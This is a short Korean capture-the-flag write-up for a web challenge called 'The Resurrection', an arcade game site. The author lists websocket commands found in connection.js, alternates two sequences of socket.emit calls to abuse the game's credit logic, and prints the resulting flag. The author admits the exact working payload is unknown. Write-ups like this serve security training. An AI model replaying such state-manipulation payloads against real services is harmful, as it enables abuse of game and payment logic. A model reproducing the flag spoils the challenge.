## No.20 Web The Resurrection[300]

**점수:** 300

**분야:** Web

**제목:** The Resurrection

----

주어진 웹사이트에 접속하면 오락기가 뜬다.
 
`connection.js` 를 분석하면 

웹 소켓으로 보낼만한 명령어들을 알 수 있다.

```js
socket.emit('login','')  // 로그인
 
socket.emit('game_start',''); // 게임 시작(credit X)
 
socket.emit('insert_coin', ''); // 코인 삽입
 
socket.emit('start_map',''); // 맵파일
 
socket.emit('next_map',''); // 플래그 있는 맵파일(오픈 시 사망)
 
socket.emit('eject_credit', ''); // 코인 eject
 
socket.emit('dead',''); // 사망
 
socket.emit('key',''); // get flag
```
 
위의 명령들을 조합하여 아래와 같은 페이로드를 보냈다. 
 
```js
// 페이로드 1
socket.emit('login','')
socket.emit('game_start',''); // 게임 시작(credit X)
socket.emit('insert_coin', ''); // 코인 삽입
socket.emit('start_map',''); // 맵파일
socket.emit('next_map',''); // 플래그 있는 맵파일(오픈 시 사망)
socket.emit('eject_credit', ''); // 코인 eject
socket.emit('dead',''); // 사망
 
// 페이로드 2
socket.emit('insert_coin', ''); // 코인 삽입
socket.emit('game_start',''); // 게임 시작
socket.emit('start_map',''); // 맵파일
socket.emit('next_map',''); // 플래그 있는 맵파일(오픈 시 사망)
socket.emit('key',''); // get flag
``` 

정확한 페이로드는 모르겠으나, 페이로드 1과 페이로드 2를 번갈아가며 보내다 보니 키를 받을 수 있었다.
 
`HU37_HF2017{Heroes_never_die_For_a_price}`

